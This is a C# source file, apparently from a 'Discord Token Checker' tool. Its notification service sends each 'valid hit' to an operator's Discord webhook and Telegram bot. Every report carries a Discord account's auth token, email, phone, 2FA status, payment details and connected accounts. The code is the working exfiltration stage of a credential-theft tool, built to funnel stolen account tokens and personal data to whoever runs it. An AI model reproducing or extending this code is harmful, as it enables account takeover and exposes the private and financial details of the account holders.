using System.Net.Http;
using System.Text;
using System.Text.Json;
using DiscordTokenChecker.Models;

namespace DiscordTokenChecker.Services;

public class NotificationService
{
    private static readonly HttpClient _http = new() { Timeout = TimeSpan.FromSeconds(10) };

    public string? DiscordWebhookUrl { get; set; }
    public string? TelegramBotToken { get; set; }
    public string? TelegramChatId { get; set; }

    public bool IsDiscordEnabled => !string.IsNullOrWhiteSpace(DiscordWebhookUrl);
    public bool IsTelegramEnabled => !string.IsNullOrWhiteSpace(TelegramBotToken) && !string.IsNullOrWhiteSpace(TelegramChatId);

    public async Task SendValidHitAsync(TokenResult result)
    {
        var tasks = new List<Task>();

        if (IsDiscordEnabled)
            tasks.Add(SendDiscordWebhookAsync(result));

        if (IsTelegramEnabled)
            tasks.Add(SendTelegramAsync(result));

        if (tasks.Count > 0)
        {
            try { await Task.WhenAll(tasks); }
            catch { /* silently ignore notification errors */ }
        }
    }

    private async Task SendDiscordWebhookAsync(TokenResult r)
    {
        var nitroEmoji = r.NitroType switch
        {
            "NITRO" => "💎",
            "BASIC" => "✨",
            "NITRO BASIC" => "⭐",
            _ => "❌"
        };

        var verifiedEmoji = r.Verified ? "✅" : "❌";
        var twoFaEmoji = r.TwoFA == "Yes" ? "🔒" : "🔓";
        var paymentEmoji = (r.PaymentInfo ?? "None") != "None" ? "💳" : "❌";

        var fields = new List<object>
        {
            new { name = "👤 Username", value = $"```{Sanitize(r.Username)}```", inline = true },
            new { name = "🆔 ID", value = $"```{Sanitize(r.Id)}```", inline = true },
            new { name = "\u200b", value = "\u200b", inline = true },

            new { name = "📧 Email", value = $"```{Sanitize(r.Email)}```", inline = true },
            new { name = "📱 Phone", value = $"```{(string.IsNullOrEmpty(r.Phone) ? "None" : Sanitize(r.Phone))}```", inline = true },
            new { name = "\u200b", value = "\u200b", inline = true },

            new { name = $"{nitroEmoji} Nitro", value = $"```{Sanitize(r.NitroType)}```", inline = true },
            new { name = "📅 Nitro Since", value = $"```{(string.IsNullOrEmpty(r.NitroSince) ? "None" : Sanitize(r.NitroSince))}```", inline = true },
            new { name = "\u200b", value = "\u200b", inline = true },

            new { name = $"{verifiedEmoji} Verified", value = $"```{r.Verified}```", inline = true },
            new { name = $"{twoFaEmoji} 2FA", value = $"```{Sanitize(r.TwoFA)}```", inline = true },
            new { name = "🌍 Locale", value = $"```{Sanitize(r.Locale)}```", inline = true },

            new { name = $"{paymentEmoji} Payment", value = $"```{(string.IsNullOrEmpty(r.PaymentInfo) ? "None" : Sanitize(r.PaymentInfo))}```", inline = false },
            new { name = "🔗 Connected", value = $"```{(string.IsNullOrEmpty(r.ConnectedAccounts) ? "None" : Sanitize(r.ConnectedAccounts))}```", inline = false },
            new { name = "🔑 Token", value = $"```{Sanitize(r.Token)}```", inline = false }
        };

        var embed = new
        {
            title = "⚡ Valid Token Found",
            color = 5793266, // #5865F2 blurple
            fields,
            footer = new { text = $"Discord Token Checker v1.3.0 • {DateTime.Now:yyyy-MM-dd HH:mm:ss}" },
            thumbnail = new { url = "https://cdn.discordapp.com/embed/avatars/0.png" }
        };

        var payload = new { embeds = new[] { embed } };
        var json = JsonSerializer.Serialize(payload);
        var content = new StringContent(json, Encoding.UTF8, "application/json");

        await _http.PostAsync(DiscordWebhookUrl, content);
    }

    private async Task SendTelegramAsync(TokenResult r)
    {
        var sb = new StringBuilder();
        sb.AppendLine("⚡ <b>Valid Token Found</b>");
        sb.AppendLine("━━━━━━━━━━━━━━━━━━━━");
        sb.AppendLine();
        sb.AppendLine($"👤 <b>Username:</b> <code>{Escape(r.Username)}</code>");
        sb.AppendLine($"🆔 <b>ID:</b> <code>{Escape(r.Id)}</code>");
        sb.AppendLine($"📧 <b>Email:</b> <code>{Escape(r.Email)}</code>");
        sb.AppendLine($"📱 <b>Phone:</b> <code>{(string.IsNullOrEmpty(r.Phone) ? "None" : Escape(r.Phone))}</code>");
        sb.AppendLine();
        sb.AppendLine($"💎 <b>Nitro:</b> <code>{Escape(r.NitroType)}</code>");
        sb.AppendLine($"📅 <b>Since:</b> <code>{(string.IsNullOrEmpty(r.NitroSince) ? "None" : Escape(r.NitroSince))}</code>");
        sb.AppendLine($"✅ <b>Verified:</b> <code>{r.Verified}</code>");
        sb.AppendLine($"🔒 <b>2FA:</b> <code>{Escape(r.TwoFA)}</code>");
        sb.AppendLine($"🌍 <b>Locale:</b> <code>{Escape(r.Locale)}</code>");
        sb.AppendLine();
        sb.AppendLine($"💳 <b>Payment:</b> <code>{(string.IsNullOrEmpty(r.PaymentInfo) ? "None" : Escape(r.PaymentInfo))}</code>");
        sb.AppendLine($"🔗 <b>Connected:</b> <code>{(string.IsNullOrEmpty(r.ConnectedAccounts) ? "None" : Escape(r.ConnectedAccounts))}</code>");
        sb.AppendLine();
        sb.AppendLine($"🔑 <b>Token:</b>");
        sb.AppendLine($"<code>{Escape(r.Token)}</code>");
        sb.AppendLine();
        sb.AppendLine("━━━━━━━━━━━━━━━━━━━━");
        sb.AppendLine($"<i>Discord Token Checker v1.3.0 • {DateTime.Now:yyyy-MM-dd HH:mm:ss}</i>");

        var url = $"https://api.telegram.org/bot{TelegramBotToken}/sendMessage";
        var payload = new
        {
            chat_id = TelegramChatId,
            text = sb.ToString(),
            parse_mode = "HTML",
            disable_web_page_preview = true
        };

        var json = JsonSerializer.Serialize(payload);
        var content = new StringContent(json, Encoding.UTF8, "application/json");
        await _http.PostAsync(url, content);
    }

    private static string Sanitize(string? s) => string.IsNullOrEmpty(s) ? "N/A" : s.Replace("`", "'");
    private static string Escape(string? s)
    {
        if (string.IsNullOrEmpty(s)) return "N/A";
        return s.Replace("&", "&amp;").Replace("<", "&lt;").Replace(">", "&gt;");
    }
}
